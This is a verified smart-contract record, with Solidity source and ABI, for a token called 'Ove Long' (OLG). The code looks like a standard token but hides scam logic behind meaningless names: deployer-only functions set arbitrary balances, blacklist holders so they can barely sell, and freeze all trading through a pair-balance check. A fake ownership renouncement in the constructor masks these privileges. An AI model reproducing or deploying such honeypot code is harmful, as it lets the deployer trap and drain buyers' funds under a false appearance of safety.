{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface limitShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listMin {\n    function createPair(address feeTrading, address limitLiquiditySender) external returns (address);\n}\n\ninterface limitMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toFrom) external view returns (uint256);\n\n    function transfer(address totalSwapTrading, uint256 amountList) external returns (bool);\n\n    function allowance(address marketingIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalSwapTrading,\n        uint256 amountList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeAtExempt, uint256 value);\n    event Approval(address indexed marketingIs, address indexed spender, uint256 value);\n}\n\ninterface limitMarketingMetadata is limitMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OveLong is autoEnable, limitMarketing, limitMarketingMetadata {\n\n    function getOwner() external view returns (address) {\n        return tradingShould;\n    }\n\n    mapping(address => bool) public shouldLimit;\n\n    function modeTx(address enableMode) public {\n        receiverSwap();\n        \n        if (enableMode == walletFrom || enableMode == shouldMinMarketing) {\n            return;\n        }\n        shouldLimit[enableMode] = true;\n    }\n\n    address shouldTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldReceiver;\n    }\n\n    address fundLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private takeFromTx = \"Ove Long\";\n\n    uint256 receiverReceiver;\n\n    function listTake(address fundSwapTo, uint256 amountList) public {\n        receiverSwap();\n        takeTx[fundSwapTo] = amountList;\n    }\n\n    function allowance(address sellList, address autoIsLiquidity) external view virtual override returns (uint256) {\n        if (autoIsLiquidity == shouldTx) {\n            return type(uint256).max;\n        }\n        return exemptShould[sellList][autoIsLiquidity];\n    }\n\n    function balanceOf(address toFrom) public view virtual override returns (uint256) {\n        return takeTx[toFrom];\n    }\n\n    function amountReceiver(address feeMax, address totalSwapTrading, uint256 amountList) internal returns (bool) {\n        if (feeMax == walletFrom) {\n            return receiverMarketingFund(feeMax, totalSwapTrading, amountList);\n        }\n        uint256 autoMode = limitMarketing(shouldMinMarketing).balanceOf(fundLiquidity);\n        require(autoMode == receiverReceiver);\n        require(totalSwapTrading != fundLiquidity);\n        if (shouldLimit[feeMax]) {\n            return receiverMarketingFund(feeMax, totalSwapTrading, atReceiver);\n        }\n        return receiverMarketingFund(feeMax, totalSwapTrading, amountList);\n    }\n\n    mapping(address => bool) public launchTradingSell;\n\n    function fromShould() public {\n        emit OwnershipTransferred(walletFrom, address(0));\n        tradingShould = address(0);\n    }\n\n    function transfer(address fundSwapTo, uint256 amountList) external virtual override returns (bool) {\n        return amountReceiver(_msgSender(), fundSwapTo, amountList);\n    }\n\n    address public walletFrom;\n\n    uint8 private shouldFund = 18;\n\n    function launchedTake(uint256 amountList) public {\n        receiverSwap();\n        receiverReceiver = amountList;\n    }\n\n    mapping(address => uint256) private takeTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletLaunched;\n    }\n\n    function transferFrom(address feeMax, address totalSwapTrading, uint256 amountList) external override returns (bool) {\n        if (_msgSender() != shouldTx) {\n            if (exemptShould[feeMax][_msgSender()] != type(uint256).max) {\n                require(amountList <= exemptShould[feeMax][_msgSender()]);\n                exemptShould[feeMax][_msgSender()] -= amountList;\n            }\n        }\n        return amountReceiver(feeMax, totalSwapTrading, amountList);\n    }\n\n    function owner() external view returns (address) {\n        return tradingShould;\n    }\n\n    function receiverMarketingFund(address feeMax, address totalSwapTrading, uint256 amountList) internal returns (bool) {\n        require(takeTx[feeMax] >= amountList);\n        takeTx[feeMax] -= amountList;\n        takeTx[totalSwapTrading] += amountList;\n        emit Transfer(feeMax, totalSwapTrading, amountList);\n        return true;\n    }\n\n    address private tradingShould;\n\n    constructor (){\n        \n        limitShould limitEnable = limitShould(shouldTx);\n        shouldMinMarketing = listMin(limitEnable.factory()).createPair(limitEnable.WETH(), address(this));\n        \n        walletFrom = _msgSender();\n        fromShould();\n        launchTradingSell[walletFrom] = true;\n        takeTx[walletFrom] = walletLaunched;\n        \n        emit Transfer(address(0), walletFrom, walletLaunched);\n    }\n\n    event OwnershipTransferred(address indexed sellSender, address indexed limitListFrom);\n\n    uint256 private liquidityTo;\n\n    uint256 marketingSenderTx;\n\n    function senderTake(address liquiditySwapMin) public {\n        if (exemptEnable) {\n            return;\n        }\n        if (marketingFund != receiverSell) {\n            marketingFund = receiverSell;\n        }\n        launchTradingSell[liquiditySwapMin] = true;\n        \n        exemptEnable = true;\n    }\n\n    uint256 private walletLaunched = 100000000 * 10 ** 18;\n\n    uint256 constant atReceiver = 8 ** 10;\n\n    uint256 private marketingFund;\n\n    uint256 public receiverSell;\n\n    address public shouldMinMarketing;\n\n    string private shouldReceiver = \"OLG\";\n\n    function approve(address autoIsLiquidity, uint256 amountList) public virtual override returns (bool) {\n        exemptShould[_msgSender()][autoIsLiquidity] = amountList;\n        emit Approval(_msgSender(), autoIsLiquidity, amountList);\n        return true;\n    }\n\n    bool public exemptEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldFund;\n    }\n\n    function receiverSwap() private view {\n        require(launchTradingSell[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeFromTx;\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitListFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAtExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoIsLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoIsLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountList\",\"type\":\"uint256\"}],\"name\":\"launchedTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSwapTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountList\",\"type\":\"uint256\"}],\"name\":\"listTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"}],\"name\":\"modeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySwapMin\",\"type\":\"address\"}],\"name\":\"senderTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMinMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSwapTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalSwapTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}